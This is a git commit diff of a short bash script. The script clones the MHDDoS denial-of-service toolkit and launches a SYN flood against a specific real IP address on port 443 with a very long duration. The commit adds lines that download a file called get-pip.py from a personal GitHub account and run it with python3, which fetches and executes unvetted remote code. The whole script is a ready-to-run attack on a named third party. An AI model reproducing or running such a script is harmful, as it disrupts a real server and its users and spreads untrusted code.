5f7aaf093af1ee2eb7dda47d93d135103dcb3575
ChenSa <74320851+Chen-Sa@users.noreply.github.com>
2022-09-09 19:08:47 +0000

    Update and rename 1.sh to 2.sh

--- 2.sh
+++ 2.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 git clone https://github.com/MatrixTM/MHDDoS.git
+wget https://github.com/Chen-Sa/get-pip.py
+python3 get-pip.py
 cd MHDDoS/
 pip install -r requirements.txt
 python3 start.py syn 80.96.156.22:443 100 999999
